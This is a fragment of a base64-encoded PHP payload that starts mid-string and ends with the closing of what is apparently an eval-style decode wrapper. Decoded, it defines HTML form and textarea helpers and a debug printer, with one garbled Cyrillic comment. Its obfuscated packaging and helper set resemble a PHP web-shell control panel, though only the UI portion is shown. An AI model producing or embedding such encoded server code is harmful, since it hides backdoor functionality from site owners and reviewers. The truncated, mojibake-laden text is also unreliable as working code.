mFtZV1cIiBpZD1cIiRhcmdbbmFtZV1cIiBhY3Rpb249XCIkYXJnW2FjdGlvbl1cIiBtZXRob2Q9XCIkYXJnW21ldGhvZF1cIiAkYXJnW3RhcmdldF0+Iik7IA0KICAgIGlmICgkYXJnWyd0aXRsZSddKSB7IA0KICAgICAgICBwKCc8aDI+Jy4kYXJnWyd0aXRsZSddLicgJnJhcXVvOzwvaDI+Jyk7IA0KICAgIH0gDQp9IA0KICAgICANCmZ1bmN0aW9uIG1ha2V0ZXh0KCRhcmcgPSBhcnJheSgpKXsgDQogICAgISRhcmdbJ2NvbHMnXSAmJiAkYXJnWydjb2xzJ10gPSAxMDA7IA0KICAgICEkYXJnWydyb3dzJ10gJiYgJGFyZ1sncm93cyddID0gMjU7IA0KICAgICRhcmdbJ3RpdGxlJ10gPSAkYXJnWyd0aXRsZSddID8gJGFyZ1sndGl0bGUnXS4nPGJyIC8+JyA6ICcnOyANCiAgICBwKCI8cD4kYXJnW3RpdGxlXTx0ZXh0YXJlYSBjbGFzcz1cImFyZWFcIiBpZD1cIiRhcmdbbmFtZV1cIiBuYW1lPVwiJGFyZ1tuYW1lXVwiIGNvbHM9XCIkYXJnW2NvbHNdXCIgcm93cz1cIiRhcmdbcm93c11cIiAkYXJnW2V4dHJhXT4kYXJnW3ZhbHVlXTwvdGV4dGFyZWE+PC9wPiIpOyANCn0gDQoNCmZ1bmN0aW9uIGZvcm1mb290ZXIoJG5hbWUgPSAnJyl7IA0KICAgICEkbmFtZSAmJiAkbmFtZSA9ICdzdWJtaXQnOyANCiAgICBwKCc8cD48aW5wdXQgY2xhc3M9ImJ0IiBuYW1lPSInLiRuYW1lLiciIGlkPVwiJy4kbmFtZS4nXCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU3VibWl0Ij48L3A+Jyk7IA0KICAgIHAoJzwvZm9ybT4nKTsgDQp9IA0KDQpmdW5jdGlvbiBmb3JtZm9vdCgpeyANCiAgICBwKCc8L2Zvcm0+Jyk7IA0KfSANCg0KLy8g0JPigJrQksK10JPRk9CSwrfQk9GT0JUg0JPRk9Cy0ILRnNCT4oCa0JLRlNCT4oCa0JLQh9CT0ZPQlSDQk9GT0JLQhSANCmZ1bmN0aW9uIHByKCRhKSB7IA0KICAgIGVjaG8gJzxwcmU+JzsgDQogICAgcHJpbnRfcigkYSk7IA0KICAgIGVjaG8gJzwvcHJlPic7IA0KfSANCj8+IA0KPC90ZD48L3RyPjwvdGFibGU+IA0KPC90ZD48L3RyPg=='));
